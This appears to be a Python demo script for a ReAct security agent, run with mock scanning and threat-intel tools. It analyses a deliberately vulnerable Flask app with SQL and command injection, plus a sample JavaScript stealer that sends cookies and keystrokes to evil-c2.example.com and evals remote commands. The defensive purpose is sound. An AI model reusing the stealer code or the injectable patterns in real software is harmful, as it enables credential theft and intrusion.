"""
2.4.7 命令行 Demo — 端到端 ReAct Agent 分析演示

模拟工具链，完整展示 Thought → Action → Observe 循环流程。
"""
import os
import sys
import logging
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from app.agent.llm import LLMClient
from app.agent.engine import AgentEngine
from app.agent.schemas import tool_registry

logger = logging.getLogger(__name__)

# ==============================================================================
# 模拟工具（模块 4 完成后替换为真实实现）
# ==============================================================================

def mock_scan_code(code: str, language: str) -> dict:
    """模拟 semgrep/bandit 静态扫描。"""
    findings = []
    code_lower = code.lower()

    if "f\"select" in code_lower or "f'select" in code_lower or "'%s'" in code or "\"%s\"" in code:
        findings.append({
            "rule_id": "python.sqlalchemy.security.sql-injection",
            "severity": "high",
            "message": "检测到使用字符串格式化构造 SQL 查询，可能存在 SQL 注入",
            "cwe": "CWE-89",
        })
    if "' + " in code_lower and "select" in code_lower:
        findings.append({
            "rule_id": "python.lang.security.sql-injection-string-concat",
            "severity": "high",
            "message": "检测到使用字符串拼接构造 SQL 查询",
            "cwe": "CWE-89",
        })
    if "os.system" in code_lower or "subprocess.call" in code_lower:
        findings.append({
            "rule_id": "python.lang.security.command-injection",
            "severity": "high",
            "message": "检测到使用 os.system/subprocess 执行命令，可能存在命令注入",
            "cwe": "CWE-78",
        })
    if "eval(" in code_lower or "exec(" in code_lower:
        findings.append({
            "rule_id": "python.lang.security.eval-injection",
            "severity": "medium",
            "message": "使用 eval/exec 执行动态代码，存在代码注入风险",
            "cwe": "CWE-95",
        })
    if "password" in code_lower and ("'" in code or '"' in code) and "hash" not in code_lower and "bcrypt" not in code_lower:
        findings.append({
            "rule_id": "python.lang.security.hardcoded-password",
            "severity": "medium",
            "message": "可能使用明文密码存储",
            "cwe": "CWE-798",
        })
    if "pickle.load" in code_lower:
        findings.append({
            "rule_id": "python.lang.security.deserialization",
            "severity": "high",
            "message": "使用 pickle 反序列化不可信数据",
            "cwe": "CWE-502",
        })

    if not findings:
        findings.append({
            "rule_id": "none",
            "severity": "info",
            "message": "未检测到明显的安全规则匹配",
            "cwe": "",
        })

    return {
        "status": "ok",
        "tool": f"semgrep (language={language})",
        "total_findings": len([f for f in findings if f["rule_id"] != "none"]),
        "findings": findings,
    }


def mock_query_cwe(cwe_id: str) -> dict:
    """模拟 CWE 查询。"""
    cwe_db = {
        "CWE-89": {
            "id": "CWE-89",
            "name": "SQL 注入",
            "description": "软件构造的 SQL 查询中包含的特定元素未能充分中和，导致 SQL 语句的预期结构被改变。",
            "mitigation": "使用参数化查询（Prepared Statements）或 ORM 框架。",
            "severity": "high",
        },
        "CWE-78": {
            "id": "CWE-78",
            "name": "OS 命令注入",
            "description": "软件构造的 OS 命令中包含的特定元素未能充分中和。",
            "mitigation": "避免使用 shell=True，使用参数数组形式传递命令参数，或使用白名单校验。",
            "severity": "high",
        },
        "CWE-95": {
            "id": "CWE-95",
            "name": "代码注入（eval/exec）",
            "description": "软件对来自不可信来源的代码进行 eval/exec 执行。",
            "mitigation": "避免使用 eval/exec，使用安全替代方案（如 ast.literal_eval）。",
            "severity": "medium",
        },
        "CWE-798": {
            "id": "CWE-798",
            "name": "硬编码凭据",
            "description": "软件包含硬编码的凭据（密码、密钥等）。",
            "mitigation": "使用环境变量或密钥管理服务存储凭据。",
            "severity": "medium",
        },
        "CWE-502": {
            "id": "CWE-502",
            "name": "不可信数据反序列化",
            "description": "软件反序列化了来自不可信源的数据。",
            "mitigation": "避免反序列化不可信数据，或使用安全的序列化格式（如 JSON）。",
            "severity": "high",
        },
    }
    return cwe_db.get(cwe_id, {"id": cwe_id, "name": "未知", "description": "暂无数据", "mitigation": "暂无数据"})


def mock_query_cve(keyword: str = "", cve_id: str = "") -> dict:
    """模拟 CVE 查询。"""
    return {
        "status": "ok",
        "query": keyword or cve_id,
        "results": [
            {"cve_id": "CVE-2021-44228", "name": "Log4Shell", "cvss": 10.0, "description": "Log4j JNDI 注入漏洞"},
        ],
    }


def mock_extract_file_features(file_path: str) -> dict:
    """模拟文件特征提取。"""
    return {
        "status": "ok",
        "file_type": "Script",
        "file_size": 1024,
        "md5": "abc123",
        "sha256": "def456",
        "imports": ["XMLHttpRequest", "WebSocket"],
        "strings_of_interest": [
            "evil-c2.example.com",
            "document.cookie",
            "eval(",
            "keydown",
        ],
    }


def mock_extract_iocs(text: str) -> dict:
    """模拟 IOC 提取。"""
    return {
        "status": "ok",
        "iocs": [
            {"type": "domain", "value": "evil-c2.example.com"},
            {"type": "url", "value": "https://evil-c2.example.com/collect"},
            {"type": "url", "value": "wss://evil-c2.example.com/ws"},
        ],
    }


def mock_query_threat_intel(ioc_type: str, ioc_value: str) -> dict:
    """威胁情报查询 — 优先使用真实 OTX/URLhaus API，失败时降级为模拟数据。"""
    try:
        from app.tools.threat_intel import query_threat_intel
        result = query_threat_intel(ioc_type=ioc_type, ioc_value=ioc_value)
        if result.get("status") == "error":
            logger.warning("威胁情报查询失败，降级为模拟: %s", result.get("error"))
        else:
            return result
    except Exception as e:
        logger.warning("威胁情报模块加载失败，使用模拟数据: %s", e)

    if "evil" in ioc_value.lower():
        return {
            "status": "ok",
            "ioc_type": ioc_type,
            "ioc_value": ioc_value,
            "malicious": True,
            "sources": ["OTX", "URLhaus"],
            "pulse_count": 5,
        }
    return {"status": "ok", "ioc_type": ioc_type, "ioc_value": ioc_value, "malicious": False, "pulse_count": 0}


def mock_map_attack(behavior: str) -> dict:
    """模拟 ATT&CK 映射。"""
    mapping = {
        "credential dumping": ("T1003", "OS Credential Dumping", "Credential Access"),
        "remote file download": ("T1105", "Ingress Tool Transfer", "Command and Control"),
        "keylogging": ("T1056", "Input Capture", "Collection"),
        "c2 communication": ("T1071", "Application Layer Protocol", "Command and Control"),
    }
    behavior_lower = behavior.lower()
    for key, (tid, name, tactic) in mapping.items():
        if key in behavior_lower:
            return {"technique_id": tid, "technique_name": name, "tactic": tactic}
    return {"technique_id": "T1203", "technique_name": "Exploitation for Client Execution", "tactic": "Execution"}


def mock_scan_yara(file_path: str) -> dict:
    """模拟 YARA 扫描。"""
    return {"status": "ok", "matches": [], "message": "未匹配已知恶意软件家族规则"}


# ==============================================================================
# 注册所有模拟工具
# ==============================================================================
def register_mock_tools(engine: AgentEngine) -> None:
    """将所有模拟工具注册到 Agent 引擎。"""
    engine.register_tool("scan_code", mock_scan_code)
    engine.register_tool("query_cwe", mock_query_cwe)
    engine.register_tool("query_cve", mock_query_cve)
    engine.register_tool("extract_file_features", mock_extract_file_features)
    engine.register_tool("extract_iocs", mock_extract_iocs)
    engine.register_tool("query_threat_intel", mock_query_threat_intel)
    engine.register_tool("map_attack", mock_map_attack)
    engine.register_tool("scan_yara", mock_scan_yara)


# ==============================================================================
# Demo 1：代码漏洞检测
# ==============================================================================
VULN_CODE = '''\
import sqlite3
from flask import Flask, request

app = Flask(__name__)

@app.route("/user/<username>")
def get_user(username):
    conn = sqlite3.connect("users.db")
    cursor = conn.cursor()
    query = f"SELECT * FROM users WHERE username = '{username}'"
    cursor.execute(query)
    result = cursor.fetchone()
    conn.close()
    return str(result)

@app.route("/admin/exec")
def admin_exec():
    cmd = request.args.get("cmd", "")
    import os
    os.system("ping " + cmd)
    return "OK"

if __name__ == "__main__":
    app.run(debug=True)
'''


def demo_code_audit():
    print("=" * 70)
    print("  Demo 1: 代码漏洞检测 — Python Flask SQL 注入 + 命令注入")
    print("=" * 70)

    llm = LLMClient(max_tokens=2048, max_input_tokens=8000)
    engine = AgentEngine(llm=llm, max_steps=8)
    register_mock_tools(engine)

    # 实时输出每个步骤
    def on_step(step: dict) -> None:
        step_num = step.get("step_num", "?")
        step_type = step["type"]
        data = step.get("data", {})

        if step_type == "thought":
            content = data.get("content", "")
            tools = data.get("tool_calls_requested", [])
            content_preview = content[:120].replace("\n", " ") if content else "(直接调用工具)"
            print(f"\n  [Step {step_num}] THOUGHT")
            print(f"    {content_preview}")
            if tools:
                print(f"    >>> 决定调用工具: {', '.join(tools)}")

        elif step_type == "action":
            for r in data.get("results", []):
                status = "OK" if r.get("ok") else "FAIL"
                args_str = ", ".join(f"{k}={v}" for k, v in r.get("args", {}).items())
                for k, v in r.get("args", {}).items():
                    if len(str(v)) > 40:
                        args_str = args_str.replace(str(v), str(v)[:40] + "...")
                print(f"    [Action] {r['name']}({args_str}) → {status}")

        elif step_type == "observation":
            for obs in data.get("observations", []):
                preview = obs.get("result_preview", "")[:100]
                print(f"    [Observe] {obs['tool']}: {preview}")

        elif step_type == "done":
            print(f"\n  >>> 分析完成 <<<")

        elif step_type == "error":
            print(f"  [ERROR] {data}")

    engine.on_step(on_step)

    user_msg = (
        "请分析以下 Python Flask 应用的安全问题。"
        "注意：请按照 Prompt 中的流程，先调用 scan_code 扫描，"
        "然后对发现的问题调用 query_cwe 获取详情，"
        "最后输出 JSON 格式的完整分析报告。"
        f"\n\n```python\n{VULN_CODE}\n```"
    )

    print("\n  >>> 开始分析...\n")
    result = engine.run(task_type="vulnerability_detection", input_content=user_msg)

    print(f"\n{'=' * 70}")
    print(f"  分析结果")
    print(f"{'=' * 70}")
    print(f"  总步数: {result['total_steps']}")
    print(f"  总耗时: {result['elapsed_seconds']}s")
    print(f"  Token:  {result['usage']}")

    if result["error"]:
        print(f"  ERROR: {result['error']}")

    if result["result"]:
        print(f"\n  --- 最终报告（前 2000 字符）---\n")
        print(result["result"][:2000])

    print(f"\n  [OK] Demo 1 Complete\n")


# ==============================================================================
# Demo 2：恶意代码分析
# ==============================================================================
MALICIOUS_JS = '''\
var xhr = new XMLHttpRequest();
xhr.open("POST", "https://evil-c2.example.com/collect", true);

var data = {
    cookies: document.cookie,
    userAgent: navigator.userAgent,
    url: window.location.href
};
xhr.send(JSON.stringify(data));

document.addEventListener("keydown", function(e) {
    // Keylogger: send keystrokes
    var kxhr = new XMLHttpRequest();
    kxhr.open("POST", "https://evil-c2.example.com/keys", true);
    kxhr.send(JSON.stringify({key: e.key}));
});

var ws = new WebSocket("wss://evil-c2.example.com/ws");
ws.onmessage = function(e) {
    var cmd = JSON.parse(e.data);
    eval(cmd.code);
};
'''


def demo_malware_analysis():
    print("\n" + "=" * 70)
    print("  Demo 2: 恶意代码分析 — JavaScript 信息窃取脚本")
    print("=" * 70)

    llm = LLMClient(max_tokens=2048, max_input_tokens=8000)
    engine = AgentEngine(llm=llm, max_steps=8)
    register_mock_tools(engine)

    def on_step(step: dict) -> None:
        step_num = step.get("step_num", "?")
        step_type = step["type"]
        data = step.get("data", {})

        if step_type == "thought":
            content = data.get("content", "")
            tools = data.get("tool_calls_requested", [])
            content_preview = content[:120].replace("\n", " ") if content else "(直接调用工具)"
            print(f"\n  [Step {step_num}] THOUGHT")
            print(f"    {content_preview}")
            if tools:
                print(f"    >>> 决定调用工具: {', '.join(tools)}")

        elif step_type == "action":
            for r in data.get("results", []):
                status = "OK" if r.get("ok") else "FAIL"
                args_str = ", ".join(f"{k}={str(v)[:40]}" for k, v in r.get("args", {}).items())
                print(f"    [Action] {r['name']}({args_str}) → {status}")

        elif step_type == "observation":
            for obs in data.get("observations", []):
                preview = obs.get("result_preview", "")[:100]
                print(f"    [Observe] {obs['tool']}: {preview}")

    engine.on_step(on_step)

    user_msg = (
        "请分析以下可疑 JavaScript 文件的安全性。"
        "请按照 Prompt 中的流程进行分析，先提取文件特征和 IOC，"
        "然后查询威胁情报，映射 ATT&CK 技术，"
        "最后输出 JSON 格式的完整分析报告。"
        f"\n\n```javascript\n{MALICIOUS_JS}\n```"
    )

    print("\n  >>> 开始分析...\n")
    result = engine.run(task_type="malware_analysis", input_content=user_msg)

    print(f"\n{'=' * 70}")
    print(f"  分析结果")
    print(f"{'=' * 70}")
    print(f"  总步数: {result['total_steps']}")
    print(f"  总耗时: {result['elapsed_seconds']}s")
    print(f"  Token:  {result['usage']}")

    if result["error"]:
        print(f"  ERROR: {result['error']}")

    if result["result"]:
        print(f"\n  --- 最终报告（前 2000 字符）---\n")
        print(result["result"][:2000])

    print(f"\n  [OK] Demo 2 Complete\n")


# ==============================================================================
# Main
# ==============================================================================
if __name__ == "__main__":
    demo_code_audit()
    demo_malware_analysis()
    print("=" * 70)
    print("  All demos completed!")
    print("=" * 70)
